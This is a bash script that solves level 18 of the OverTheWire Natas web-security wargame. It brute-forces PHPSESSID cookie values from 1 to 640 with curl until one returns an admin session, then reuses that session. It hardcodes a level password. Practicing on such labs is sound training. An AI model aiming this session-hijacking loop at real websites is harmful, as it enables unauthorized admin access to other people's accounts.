#!/usr/bin/env bash

passwordNatas18=""
defaultPasswordNatas18="6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"

echo -n "Password Natas 18 (default is ${defaultPasswordNatas18}): "
read passwordNatas18
if [ -z ${passwordNatas18} ]
then
        passwordNatas18=${defaultPasswordNatas18}
fi

for id in {1..640}
do
	echo "PHPSESSID=${id}"
	res=$(curl -s -u natas18:${passwordNatas18} natas18.natas.labs.overthewire.org\?debug=true --cookie "PHPSESSID=${id}")
	if echo ${res} | grep "You are an admin" > /dev/null
	then
		curl -s -u natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ natas18.natas.labs.overthewire.org --cookie "PHPSESSID=${id}"
		break
	fi
done
	

